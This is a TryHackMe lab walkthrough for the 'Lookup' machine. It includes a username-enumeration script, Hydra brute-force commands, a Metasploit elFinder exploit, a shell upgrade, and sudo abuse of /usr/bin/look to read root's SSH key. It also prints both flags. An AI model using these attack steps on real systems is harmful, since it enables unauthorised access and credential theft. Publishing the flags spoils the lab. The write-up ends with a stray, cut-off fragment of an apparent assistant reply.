

# Lookup — TryHackMe Walkthrough

> **Target:** `lookup.thm` / `files.lookup.thm`
> **OS:** Ubuntu 20.04 (elFinder web app)
> **Goal:** user & root flags

---

## Table of contents

* [Overview](#overview)
* [Recon](#recon)
* [Username enumeration](#username-enumeration)
* [Password brute-force (jose)](#password-brute-force-jose)
* [elFinder & initial access](#elfinder--initial-access)
* [Privilege escalation](#privilege-escalation)
* [Flags](#flags)
* [Lessons learned](#lessons-learned)
* [Appendix — scripts & commands](#appendix---scripts--commands)

---

## Overview

This machine hosts a web application that redirects to `lookup.thm`. The app contains a login form and a file manager (`elFinder`). By enumerating usernames and attacking one found account (`jose`), I gained access to elFinder, exploited a known elFinder vulnerability to get a shell as `www-data`, escalated to the `think` user, and then gained root by abusing a `sudo` permission (`/usr/bin/look`) to read root’s private SSH key.

---

## Recon

Start with an nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oN nmap.txt 10.10.147.56
```

Notable results:

* `22/tcp` — OpenSSH
* `80/tcp` — Apache httpd (redirects to `lookup.thm`)

We can see the web server redirects to `lookup.thm`; add an entry to `/etc/hosts` and browse it:

```bash
echo "10.10.147.56 lookup.thm" | sudo tee -a /etc/hosts
# then open http://lookup.thm in your browser
```

`lookup.thm` presents a simple login page.

---

## Username enumeration

At first I tried common creds such as `admin:admin` and `admin:password` — they didn’t work. SQLi attempts also failed. After some manual testing, I noticed the application returned different messages for wrong username vs wrong password. That allowed username enumeration.

I created a small Python script to find valid usernames by looking for the exact failure string returned (`Wrong password. Please try again.`). Below is the **fixed** and slightly improved script (the original had a small typo):

```python
#!/usr/bin/env python3
import requests
import time

URL = "http://lookup.thm/login.php"
WORDLIST = "/usr/share/seclists/Usernames/Names/names.txt"
PAUSE = 0.5  # polite pause between requests

headers = {"User-Agent": "Mozilla/5.0 (EnumerationBot/1.0)"}

with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as fh:
    for line in fh:
        username = line.strip()
        if not username:
            continue

        data = {"username": username, "password": "password"}  # fixed test password
        try:
            resp = requests.post(URL, data=data, headers=headers, timeout=10)
        except requests.RequestException as e:
            print(f"[!] Request failed for {username}: {e}")
            continue

        text = resp.text.lower()
        # adjust the substring if the site uses different wording
        if "wrong password" in text:
            print(f"[+] Username found: {username}")
        # else: likely wrong username — be quiet

        time.sleep(PAUSE)
```

> Note: The script uses a hard-coded wordlist path — change `WORDLIST` if you want to use a different list. Throttle requests (`PAUSE`) so you don’t cause account lockouts or trip IDS.

Running this script revealed an additional username: **jose**. (This process can take some time with a large wordlist — threading or a curated small list speeds this up.)

---

## Password brute-force (jose)

With the `jose` username discovered, I used Hydra to test common passwords. Important: verify the exact failure string first with `curl` so Hydra can reliably detect failed logins:

```bash
# Confirm the failure message
curl -i -s -X POST -d "username=jose&password=badpass" http://lookup.thm/login.php | sed -n '1,200p'
# Example response contained:
# Wrong password. Please try again.
```

Hydra command used (start with a small test list first):

```bash
# small test list
cat > small.txt <<'EOF'
123456
password
qwerty
letmein
password123
EOF

hydra -l jose -P small.txt lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again." \
  -t 2 -f -V
```

After escalation to a larger list (`rockyou.txt`) and careful throttling, Hydra found the valid credential:

```
jose:password123
```


## elFinder & initial access

Logging in with `jose:password123` redirected me to `files.lookup.thm` (add hosts entry: `10.10.147.56 files.lookup.thm`), which runs **elFinder** — a web-based file manager.


I inspected the UI and static assets and identified the elFinder version as **2.1.47** (the version string is often in `elfinder.full.js` or visible in the UI).

Knowing the version, I researched public advisories and Metasploit modules. Metasploit contains a module for the **exiftran command injection** affecting elFinder versions `< 2.1.48`, which matched our target.

> **Note:** Always check the exact version before assuming exploitability.

### Gaining a shell

I used the Metasploit elFinder exiftran module to exploit the vulnerable connector (module details and options shown with `info` and `show options` in `msfconsole`). That yielded a meterpreter session as `www-data`. The initial session was unstable (short-lived uploader process), so I uploaded a stable reverse shell webscript and also used `netcat` as a listener to get a more reliable shell. After upgrading the shell (`python3 -c "import pty; pty.spawn('/bin/bash')"`) I had an interactive `www-data` shell.


---

## Privilege escalation

From the web shell (`www-data`) I explored the webroot and home directories. In `/home/think` I found `user.txt` (user flag) but needed higher privileges.

I checked sudo rights:

```bash
sudo -l
```

Output showed:

```
User think may run the following commands on ip-10-10-68-218:
    (ALL) /usr/bin/look
```

`/usr/bin/look` is normally used to print lines in a file that begin with a given string. When run via `sudo`, it opens the target file as root — so you can read files that your user cannot.

I used `look` to dump root’s SSH private key and root flag:

```bash
# read root ssh private key
sudo /usr/bin/look '' /root/.ssh/id_rsa

# read root flag
sudo /usr/bin/look '' /root/root.txt
```

This returned both the private key and the `root.txt` contents. I saved the leaked key locally (on the attack VM), set `chmod 600`, and SSH’d into the box as root using that key:

```bash
ssh -i id_rsa root@lookup.thm
```

Once root, I viewed `/root/root.txt`:


---

## Flags

* `user.txt` — `38375fb4dd8baa2b2039ac03d92b820e`
* `root.txt` — `5a285a9f257e45c68bb6c9f9f57d18e8`

---

## Lessons learned

* **Error message differences** (username vs password errors) can enable username enumeration — always check the exact site behaviour.
* **Patch management matters** — elFinder versions before 2.1.48/2.1.59 had known vulnerabilities; keep web apps up to date.
* **Sudo misconfigurations** are low-hanging fruit. `sudo -l` should always be checked — it often yields direct privilege escalation paths.
* **When a post-exploit session is unstable**, migrate to a long-lived process or use an alternative stable shell mechanism (webshell, reverse shell with netcat, payload migration).

ate the file content for you),
* produce a second document `writeup.md` that is more verbose and includes command outputs and exact msfconsole logs, or
* format this into a GitHub Pages-friendly README with proper screenshots and a short TL;DR for social media.

Which would you like me to generate next?
